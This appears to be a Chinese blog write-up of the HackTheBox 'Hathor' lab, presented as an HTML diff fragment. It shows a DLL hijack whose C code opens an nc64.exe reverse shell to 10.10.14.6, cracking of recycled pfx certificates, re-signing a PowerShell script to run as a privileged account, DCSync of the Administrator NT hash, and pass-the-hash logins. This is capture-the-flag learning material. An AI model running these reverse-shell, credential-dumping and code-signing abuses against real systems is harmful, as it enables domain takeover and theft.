LGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2luZGNv</span></span><br><span class="line"><span class="comment">'' SIG '' cnAxHTAbBgNVBAMTFHdpbmRjb3JwLUhBVEhPUi1DQS0x</span></span><br><span class="line"><span class="comment">'' SIG '' MB4XDTIyMTAxMjE4MzAyM1oXDTMyMTAwOTE4MzAyM1ow</span></span><br><span class="line"><span class="comment">'' SIG '' VzETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmSJomT</span></span><br><span class="line"><span class="comment">'' SIG '' 8ixkARkWCHdpbmRjb3JwMQ4wDAYDVQQDEwVVc2VyczEW</span></span><br><span class="line"><span class="comment">'' SIG '' MBQGA1UEAxMNQWRtaW5pc3RyYXRvcjCCASIwDQYJKoZI</span></span><br><span class="line"><span class="comment">'' SIG '' hvcNAQEBBQADggEPADCCAQoCggEBAOCsWmgMuC3A7kFR</span></span><br><span class="line"><span class="comment">'' SIG '' SV3ThIJHkRW+wg/h+YsgV4SLZ6fE8D1rZBx0MTLaNt8g</span></span><br><span class="line"><span class="comment">'' SIG '' xyRiQNDCXRqERx1i3QpCjAbVWDEH7Kf4OTNVGMNg1QUL</span></span><br><span class="line"><span class="comment">'' SIG '' JUi7nkB42SGVFW3Bs8sVzOC7p60dNs0YoDpX6thYNUje</span></span><br><span class="line"><span class="comment">'' SIG '' AGm/UEHd/EiMf512l0ND01rh+HieEQR4p76OR1+qel3+</span></span><br><span class="line"><span class="comment">'' SIG '' W9+J0RWybE90EAwxFlD6wnig0JyVimnWw0/8ZJ/pJtlg</span></span><br><span class="line"><span class="comment">'' SIG '' QGGNX0WlebyC5RgwCfw2Edbm4LtqQ8vFKPk1G1SIniJn</span></span><br><span class="line"><span class="comment">'' SIG '' A1pYhoMV5wi9QeZhH+FHgL+JHTzqcmxWhh6AuqZ2OEoN</span></span><br><span class="line"><span class="comment">'' SIG '' EfUmmzPSeGtKK1UDFSUCAwEAAaOCApswggKXMD0GCSsG</span></span><br><span class="line"><span class="comment">'' SIG '' AQQBgjcVBwQwMC4GJisGAQQBgjcVCILUznCD1qdohvWR</span></span><br><span class="line"><span class="comment">'' SIG '' EYToiS+G+41kgSqBkDyC69BtAgFlAgEAMBMGA1UdJQQM</span></span><br><span class="line"><span class="comment">'' SIG '' MAoGCCsGAQUFBwMDMA4GA1UdDwEB/wQEAwIHgDAbBgkr</span></span><br><span class="line"><span class="comment">'' SIG '' BgEEAYI3FQoEDjAMMAoGCCsGAQUFBwMDMB0GA1UdDgQW</span></span><br><span class="line"><span class="comment">'' SIG '' BBSRtmNDqnEAXEVStyjbKqzLwRyUgzAfBgNVHSMEGDAW</span></span><br><span class="line"><span class="comment">'' SIG '' gBTxjkqkbc2CsGldYvNjmn6LbnL2WTCB0gYDVR0fBIHK</span></span><br><span class="line"><span class="comment">'' SIG '' MIHHMIHEoIHBoIG+hoG7bGRhcDovLy9DTj13aW5kY29y</span></span><br><span class="line"><span class="comment">'' SIG '' cC1IQVRIT1ItQ0EtMSxDTj1oYXRob3IsQ049Q0RQLENO</span></span><br><span class="line"><span class="comment">'' SIG '' PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp</span></span><br><span class="line"><span class="comment">'' SIG '' Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9d2luZGNvcnAs</span></span><br><span class="line"><span class="comment">'' SIG '' REM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/</span></span><br><span class="line"><span class="comment">'' SIG '' YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Q</span></span><br><span class="line"><span class="comment">'' SIG '' b2ludDCBxwYIKwYBBQUHAQEEgbowgbcwgbQGCCsGAQUF</span></span><br><span class="line"><span class="comment">'' SIG '' BzAChoGnbGRhcDovLy9DTj13aW5kY29ycC1IQVRIT1It</span></span><br><span class="line"><span class="comment">'' SIG '' Q0EtMSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2Vy</span></span><br><span class="line"><span class="comment">'' SIG '' dmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv</span></span><br><span class="line"><span class="comment">'' SIG '' bixEQz13aW5kY29ycCxEQz1odGI/Y0FDZXJ0aWZpY2F0</span></span><br><span class="line"><span class="comment">'' SIG '' ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25B</span></span><br><span class="line"><span class="comment">'' SIG '' dXRob3JpdHkwNQYDVR0RBC4wLKAqBgorBgEEAYI3FAID</span></span><br><span class="line"><span class="comment">'' SIG '' oBwMGmFkbWluaXN0cmF0b3JAd2luZGNvcnAuaHRiMA0G</span></span><br><span class="line"><span class="comment">'' SIG '' CSqGSIb3DQEBCwUAA4IBAQAbp0/YFh2yKjHp2+vaPfOQ</span></span><br><span class="line"><span class="comment">'' SIG '' t8bUtjIuiBDfXckT/a7+ym1UI+x38RIg+Uey77Ww9Oxy</span></span><br><span class="line"><span class="comment">'' SIG '' Yg/xPQTU/JC+QNZTtDefWDknn/oXvL2QT/z9ox8vIOw6</span></span><br><span class="line"><span class="comment">'' SIG '' TkCS2pdMAv6R27J1J3ba5Rhb1lAbIo++32ZnQbNWwAa7</span></span><br><span class="line"><span class="comment">'' SIG '' DQcymBRy1o6L/jY0FFqY5aQcAcCoYm9S+FKivuQLu0eL</span></span><br><span class="line"><span class="comment">'' SIG '' x3PuuviDtsWqO6qYwWSfkCOYGRzdVTgD/hUOC1GYMsRl</span></span><br><span class="line"><span class="comment">'' SIG '' NFNbQKSDtZbcvkWPIZsa9Nww1FYUWOh5YiILwnyayuCr</span></span><br><span class="line"><span class="comment">'' SIG '' pTVvmxla555SGRMLaCz6IMPevqXuhOGb+W/P/gAaop7d</span></span><br><span class="line"><span class="comment">'' SIG '' d0VbnbPOfQTfMYICFzCCAhMCAQEwZTBOMRMwEQYKCZIm</span></span><br><span class="line"><span class="comment">'' SIG '' iZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2lu</span></span><br><span class="line"><span class="comment">'' SIG '' ZGNvcnAxHTAbBgNVBAMTFHdpbmRjb3JwLUhBVEhPUi1D</span></span><br><span class="line"><span class="comment">'' SIG '' QS0xAhMgAAAAB1twnB03VxTuAAAAAAAHMA0GCWCGSAFl</span></span><br><span class="line"><span class="comment">'' SIG '' AwQCAQUAoIGEMBgGCisGAQQBgjcCAQwxCjAIoAKAAKEC</span></span><br><span class="line"><span class="comment">'' SIG '' gAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYK</span></span><br><span class="line"><span class="comment">'' SIG '' KwYBBAGCNwIBCzEOMAwGCisGAQQBgjcCARUwLwYJKoZI</span></span><br><span class="line"><span class="comment">'' SIG '' hvcNAQkEMSIEIMAMrS4wO7Di3pqZtBcXNwHEE7EmF+k2</span></span><br><span class="line"><span class="comment">'' SIG '' G6qrSRH1n28EMA0GCSqGSIb3DQEBAQUABIIBANNeMMbj</span></span><br><span class="line"><span class="comment">'' SIG '' vGfNxmTbdqaeieDzad1W9KRj5aqQXOZjlM+pmmYvY+HG</span></span><br><span class="line"><span class="comment">'' SIG '' SziQXTPxjiH2GmxHEky11VoM7A0YSgRhhDxRgoF6zYVg</span></span><br><span class="line"><span class="comment">'' SIG '' ZQA+unmOZYg8Eas8azZkoEVD7e6119dqev6P5rpN+v7i</span></span><br><span class="line"><span class="comment">'' SIG '' jjTCd0A8yyfY0P1x064sBd+G8mv0WerKyTf+Tk7m7HmJ</span></span><br><span class="line"><span class="comment">'' SIG '' aU/U6guhCvE5ipk/3or0oT509OeDDqKijeL3wkIN+YGs</span></span><br><span class="line"><span class="comment">'' SIG '' tM0sIX9xzrCdC3pUCznVu/16+8qCNF11kROH9UI5WNxW</span></span><br><span class="line"><span class="comment">'' SIG '' nIc54rkc71MzZup+N0L5cxTDKnmUDW99XRcjwNeRGQdx</span></span><br><span class="line"><span class="comment">'' SIG '' lQgfLUl5qzTK6aRKc/nPVHD+yyQ=</span></span><br><span class="line"><span class="comment">'' SIG '' End signature block</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>直接使用密码会发现NTLM被禁用，需要通过kerberos方式：</p>
+<p>首先修改hosts：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.147 hathor.windcorp.htb</span><br></pre></td></tr></table></figure>
+
+<p>修改配置文件，使用账号密码请求ticket，使用ticket继续去枚举smb：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kinit beatricemill</span><br><span class="line">klist</span><br><span class="line">smbclient -L //hathor.windcorp.htb -U beatricemill@windcorp.htb -N -k</span><br><span class="line"><span class="meta">#</span><span class="bash"> or</span></span><br><span class="line">crackmapexec smb hathor.windcorp.htb -k -d windcorp.htb -u beatricemill -p '!!!!ilovegood17' --shares</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112106.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="Share"><a href="#Share" class="headerlink" title="Share"></a>Share</h2><p> share目录下发现AutoIt.exe和Bginfo64.exe，AutoIt.exe被applocker阻止，Bginfo64.exe是被允许的</p>
+<p>share/scripts目录下是一个7Zip库和一堆AutoIt脚本,7-zip64.dll也在applocker的白名单中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //hathor.windcorp.htb/share -U beatricemill@windcorp.htb -N -k </span><br><span class="line">smbclient //hathor.windcorp.htb/scripts -U beatricemill@windcorp.htb -N -k</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="etc-krb5-conf"><a href="#etc-krb5-conf" class="headerlink" title="/etc/krb5.conf"></a>/etc/krb5.conf</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]   </span><br><span class="line">    	default_realm &#x3D; WINDCORP.HTB</span><br><span class="line">        fcc-mit-ticketflags &#x3D; true</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">        WINDCORP.HTB &#x3D; &#123;</span><br><span class="line">                kdc &#x3D; HATHOR.WINDCORP.HTB</span><br><span class="line">                admin_server &#x3D; HATHOR.WINDCORP.HTB</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="7-zip64-dll"><a href="#7-zip64-dll" class="headerlink" title="7-zip64.dll"></a>7-zip64.dll</h1><p>枚举发现share目录下两个exe定时运行，其中AutoIt3_x64.exe的一个脚本7Zip.au3中调用了7-zip64.dll，我们可以通过smb覆盖dll来达到任意命令执行目的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR &#x2F;L %i IN (0,1,1000) DO (tasklist &#x2F;FI &quot;imagename eq Bginfo64.exe&quot; | findstr &#x2F;v &quot;No tasks&quot; &amp; tasklist &#x2F;FI &quot;imagename eq AutoIt3_x64.exe&quot; | findstr &#x2F;v &quot;No tasks&quot;  &amp; ping -n 2 127.0.0.1 &gt; NUL )</span><br></pre></td></tr></table></figure>
+
+<h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><p>(这里开始就在云了)</p>
+<p>这里因为存在杀软，需要自己写dll，通过dll的执行去进一步枚举信息，发现是GinaWild用户权限在定时运行exe，他是 ITDep 和 Protected Users 组的成员：</p>
+<p>另一方遍，<code>Bginfo64.exe</code>。用户只能读/执行，但ITDep也可以写owner( <code>WO</code>)，也就是说ginawild可以改变owner</p>
+<h2 id="战略"><a href="#战略" class="headerlink" title="战略"></a>战略</h2><p>这里是0xdf的原文：</p>
+<p><code>Bginfo64.exe</code>未被防火墙阻止，并且即使未从该路径签名，它也会在 AppLocker 中列入白名单以运行。我可以以 GinaWild 的身份运行 Dll，GinaWild 可以取得 <code>Bginfo64.exe</code>的所有权，然后对其进行修改。</p>
+<p>我将制作一个新的 Dll 来：</p>
+<ul>
+<li>拥有<code>Bginfo64.exe</code>.</li>
+<li>更新权限，以便 GinaWild 具有完全控制权。</li>
+<li>将<code>nc64.exe</code>我之前上传的复制到web目录下<code>Bginfo64.exe</code>。</li>
+<li>调用<code>nc64.exe</code>以使用反向 shell 连接回我。</li>
+</ul>
+<p>代码大概这样：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        system(<span class="string">"cmd.exe /c takeown /F C:\\share\\Bginfo64.exe"</span>);</span><br><span class="line">        system(<span class="string">"cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F"</span>);</span><br><span class="line">        system(<span class="string">"cmd.exe /c copy C:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe C:\\share\\Bginfo64.exe"</span>);</span><br><span class="line">        system(<span class="string">"cmd.exe /c C:\\share\\Bginfo64.exe -e cmd 10.10.14.6 9003"</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="GinaWild-amp-user-flag"><a href="#GinaWild-amp-user-flag" class="headerlink" title="GinaWild &amp; user flag"></a>GinaWild &amp; user flag</h1><p>执行后得到GinaWild shell和user flag</p>
+<h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>发现桌面一个快捷方式指向之前那个vbs</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\Public\Desktop&gt;powershell -c <span class="string">"<span class="variable">$sh</span> = New-Object -ComObject WScript.Shell; <span class="variable">$sh</span>.CreateShortcut('.\bAD Passwords.lnk').TargetPath"</span></span><br><span class="line">C:\Get-bADpasswords\run.vbs</span><br></pre></td></tr></table></figure>
+
+<p>GinaWild 的回收站中有文件,GinaWild 的 SID 以<code>-2663</code>结尾，回收站中查看发现3个证书文件：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c:\<span class="variable">$Recycle</span>.Bin\S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3783586571</span>-<span class="number">2109290616</span>-<span class="number">3725730865</span>-<span class="number">2663</span>&gt;dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE61-D5E0</span><br><span class="line"></span><br><span class="line"> Directory of c:\<span class="variable">$Recycle</span>.Bin\S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3783586571</span>-<span class="number">2109290616</span>-<span class="number">3725730865</span>-<span class="number">2663</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>/<span class="number">12</span>/<span class="number">2022</span>  <span class="number">08</span>:<span class="number">26</span> PM                <span class="number">98</span> <span class="variable">$IZIX7VV</span>.pfx</span><br><span class="line"><span class="number">03</span>/<span class="number">21</span>/<span class="number">2022</span>  <span class="number">03</span>:<span class="number">37</span> PM             <span class="number">4</span>,<span class="number">053</span> <span class="variable">$RLYS3KF</span>.pfx</span><br><span class="line"><span class="number">10</span>/<span class="number">12</span>/<span class="number">2022</span>  <span class="number">07</span>:<span class="number">43</span> PM             <span class="number">4</span>,<span class="number">280</span> <span class="variable">$RZIX7VV</span>.pfx</span><br><span class="line">               <span class="number">3</span> File(s)          <span class="number">8</span>,<span class="number">431</span> bytes</span><br><span class="line">               <span class="number">0</span> Dir(s)   <span class="number">9</span>,<span class="number">232</span>,<span class="number">101</span>,<span class="number">376</span> bytes free</span><br></pre></td></tr></table></figure>
+
+<p>元数据文件是二进制格式，但我可以看到以前文件名的字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663&gt;type $IZIX7VV.pfx</span><br><span class="line">ўp#C:\Users\GinaWild\Desktop\cert.pfx</span><br></pre></td></tr></table></figure>
+
+<h2 id="访问证书"><a href="#访问证书" class="headerlink" title="访问证书"></a>访问证书</h2><p>将3个证书文件复制到smb，下载下来查看，需要密码，破解出来证书密码：</p>
+<ul>
+<li>crackpkcs12/crackpkcs12: A multithreaded program to crack PKCS#12 files (p12 and pfx extensions)<br><a href="https://github.com/crackpkcs12/crackpkcs12" target="_blank" rel="noopener">https://github.com/crackpkcs12/crackpkcs12</a></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663&gt;copy * \share\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">crackpkcs12 -d /usr/share/wordlists/rockyou.txt \$RLYS3KF.pfx</span><br><span class="line"></span><br><span class="line">abceasyas123</span><br><span class="line"></span><br><span class="line">crackpkcs12 -d /usr/share/wordlists/rockyou.txt \$RZIX7VV.pfx</span><br><span class="line"></span><br><span class="line">whysoeasy?</span><br></pre></td></tr></table></figure>
+
+<p>然后使用密码提取证书：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -info -in \$RLYS3KF.pfx -noout</span><br><span class="line">openssl pkcs12 -in \$RLYS3KF.pfx -out cert.pem -nokeys</span><br><span class="line">openssl x509 -in cert.pem -noout -text</span><br></pre></td></tr></table></figure>
+
+<p>关键信息：</p>
+<ul>
+<li>subject是<code>DC = htb, DC = windcorp, CN = Users, CN = Administrator</code>。这与上面 Exe（未显示）和脚本的 AppLocker 数据中的内容相匹配：</li>
+<li>该证书用于代码签名：</li>
+</ul>
+<h1 id="Get-bADpasswords-1"><a href="#Get-bADpasswords-1" class="headerlink" title="Get-bADpasswords"></a>Get-bADpasswords</h1><p>该<code>Get-bADpasswords</code>脚本必须有权访问域密码才能完成它的工作，因此它很可能以某种特权用户身份运行。我知道它运行<code>C:\Get-bADpasswords.ps1</code>脚本，该脚本已签名，因此它将运行。我知道可以访问签名密钥，所以理论上我可以修改脚本并执行</p>
+<p>我将复制<code>Get-bADpasswords.ps1</code>到 SMB 共享以获取它的副本。我必须更改<code>.ps1</code>从该文件夹中阻止的扩展名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy Get-bADpasswords.ps1 \share\gbp.txt</span><br></pre></td></tr></table></figure>
+
+<p>我将下载脚本，并在顶部添加一行，打印有关运行脚本的用户的详细信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all &gt; C:\Programdata\0xdf.txt</span><br></pre></td></tr></table></figure>
+
+<p>现在我需要签署脚本，因为修改它会使旧签名无效。我将首先将证书导入我的用户的证书存储区并获取对它的引用<code>$cert</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; $pass &#x3D; ConvertTo-SecureString -String &#39;abceasyas123&#39; -AsPlainText -Force</span><br><span class="line"></span><br><span class="line">PS C:\get-badpasswords&gt; $cert &#x3D; Import-PfxCertificate -FilePath &#39;C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx&#39; -Password $pass -CertStoreLocation Cert:\CurrentUser\My</span><br><span class="line"></span><br><span class="line">PS C:\get-badpasswords&gt; $cert</span><br></pre></td></tr></table></figure>
+
+<p>现在我可以用它来签署文件了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\get-badpasswords&gt; Set-AuthenticodeSignature .\Get-bADpasswords.ps1 $cert</span><br></pre></td></tr></table></figure>
+
+<p>要触发执行，我将运行<code>run.vbs</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\get-badpasswords&gt; cscript .\run.vbs</span><br></pre></td></tr></table></figure>
+
+<p>现在有一个文件<code>C:\programdata</code>,它显示用户不是域管理员，而是 bpassrunner：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; cat <span class="number">0</span>xdf.txt</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name            SID                                            </span><br><span class="line">==================== ===============================================</span><br><span class="line">windcorp\bpassrunner S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3783586571</span>-<span class="number">2109290616</span>-<span class="number">3725730865</span>-<span class="number">10102</span></span><br><span class="line"></span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>
+
+<h1 id="bpassrunner"><a href="#bpassrunner" class="headerlink" title="bpassrunner"></a>bpassrunner</h1><p>我花了一点时间才弄清楚如何将它变成一个 shell。我不能只<code>nc64.exe</code>从 Web 目录调用，因为它不会通过 AppLocker。我不能使用 PowerShell，因为即使我可以对其进行签名并且它会运行，防火墙也会阻止出站连接。</p>
+<p>然后我意识到我可以尝试覆盖<code>bginfo64.exe</code>并<code>nc64.exe</code>从那里运行它。尝试这样做时，它失败了，因为该文件仍在使用中——我当前的 shell！这意味着它实际上是静止的<code>nc64.exe</code>。</p>
+<p>我会将脚本本地副本的顶部更新为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\share\Bginfo64.exe -e cmd 10.10.14.6 9004</span><br></pre></td></tr></table></figure>
+
+<p>我将上传它、签名并触发它。大约 15 秒后，我得到一个 shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Get-bADpasswords&gt;whoami</span><br><span class="line">windcorp\bpassrunner</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p><code>Get-bADpasswords</code> <a href="https://github.com/improsec/Get-bADpasswords" target="_blank" rel="noopener">GitHub README</a>说运行它：</p>
+<blockquote>
+<p>需要“域管理员”权限或类似权限，例如“域控制器”或“复制目录更改”和“复制目录更改全部”的委派域级权限，才能成功从 Active Directory 数据库中获取密码。</p>
+</blockquote>
+<p>这意味着该用户应该能够运行 DCSync 攻击。</p>
+<h2 id="dcsync"><a href="#dcsync" class="headerlink" title="dcsync"></a>dcsync</h2><p>这实际上很容易从 shell 中作为具有权限的用户使用<code>Get-ADReplAccount</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-ADReplAccount -SamAccountName administrator -Server &#39;hathor.windcorp.htb&#39;</span><br><span class="line"></span><br><span class="line">NTHash: b3ff8d7532eef396a5347ed33933030f</span><br></pre></td></tr></table></figure>
+
+<p>如果由于某种原因我无法获得 shell，我仍然可以通过脚本注入来完成此操作。我会将以下三行添加到我的本地副本的开头<code>Get-bADpasswords.ps1</code>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Transcript</span> -Path <span class="string">'C:\Programdata\0xdf-transcript.txt'</span></span><br><span class="line">Get-ADReplAccount -SamAccountName administrator -Server <span class="string">'hathor.windcorp.htb'</span></span><br><span class="line"><span class="built_in">Stop-Transcript</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>现在我们有Administrator的hash，仍然需要通过kerberos方式：</p>
+<h2 id="Kerberos-授权"><a href="#Kerberos-授权" class="headerlink" title="Kerberos 授权"></a>Kerberos 授权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ ktutil</span><br><span class="line">ktutil:  add_entry -p administrator@WINDCORP.HTB -k 1 -key -e rc4-hmac</span><br><span class="line">Key for administrator@WINDCORP.HTB (hex): b3ff8d7532eef396a5347ed33933030f</span><br><span class="line">ktutil:  write_kt administrator.keytab</span><br><span class="line">ktutil:  exit</span><br><span class="line"></span><br><span class="line">kinit -V -k -t administrator.keytab -f administrator@WINDCORP.HTB</span><br><span class="line"></span><br><span class="line">klist</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用impacket的getTGT来通过hash获取票据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getTGT.py -hashes :b3ff8d7532eef396a5347ed33933030f windcorp.htb/administrator</span><br></pre></td></tr></table></figure>
+
+<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>得到票据之后，即可任意可用方式获得shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i hathor.windcorp.htb -r WINDCORP.HTB</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> or</span></span><br><span class="line">KRB5CCNAME=./administrator.ccache evil-winrm -i hathor.windcorp.htb -r WINDCORP.HTB</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=./administrator.ccache wmiexec.py windcorp.htb/administrator@hathor.windcorp.htb -k -no-pass</span><br></pre></td></tr></table></figure>
+
+<h2 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\GinaWild\desktop\user.txt</span><br><span class="line">type C:\Users\Administrator\desktop\root.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112107.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li>Admin Password Reset - mojoPortal<br><a href="https://www.mojoportal.com/Forums/Thread.aspx?pageid=5&amp;t=2902~-1#:~:text=Enter%20%22admin%40admin.com,and%20%22admin%22%20for%20Password" target="_blank" rel="noopener">https://www.mojoportal.com/Forums/Thread.aspx?pageid=5&amp;t=2902~-1#:~:text=Enter%20%22admin%40admin.com,and%20%22admin%22%20for%20Password</a>.</li>
+<li>Vulnerabilities in Legacy File Manager · Issue #146 · i7MEDIA/mojoportal<br><a href="https://github.com/i7MEDIA/mojoportal/issues/146" target="_blank" rel="noopener">https://github.com/i7MEDIA/mojoportal/issues/146</a></li>
+<li>Enumerating Firewall And AppLocker Rules [Hathor - HackTheBox] - YouTube<br><a href="https://www.youtube.com/watch?v=w_Kro3S4xE8&amp;ab_channel=0xdf" target="_blank" rel="noopener">https://www.youtube.com/watch?v=w_Kro3S4xE8&amp;ab_channel=0xdf</a></li>
+<li>improsec/Get-bADpasswords: Get insights into the actual strength and quality of passwords in Active Directory.<br><a href="https://github.com/improsec/Get-bADpasswords" target="_blank" rel="noopener">https://github.com/improsec/Get-bADpasswords</a></li>
+<li>crackpkcs12/crackpkcs12: A multithreaded program to crack PKCS#12 files (p12 and pfx extensions)<br><a href="https://github.com/crackpkcs12/crackpkcs12" target="_blank" rel="noopener">https://github.com/crackpkcs12/crackpkcs12</a></li>
